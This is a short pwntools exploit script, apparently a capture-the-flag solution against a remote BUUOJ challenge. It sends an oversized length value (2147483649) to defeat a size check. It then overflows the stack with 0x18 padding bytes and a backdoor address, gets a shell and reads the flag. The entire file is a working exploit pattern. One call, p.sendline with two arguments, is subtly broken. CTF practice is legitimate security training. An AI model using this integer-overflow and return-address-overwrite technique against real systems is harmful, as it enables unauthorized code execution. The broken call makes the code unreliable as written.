from pwn import *
# from LibcSearcher import *

context(os = "linux", arch = "amd64", log_level= "debug")
p = remote('node5.buuoj.cn',27319)

backdoor = 0x400726
p.sendline("length of your name:", "2147483649")
payload = b'a' * 0x18 + p64(backdoor)
p.sendlineafter("name?", payload)
p.sendline("cat flag")

p.interactive()


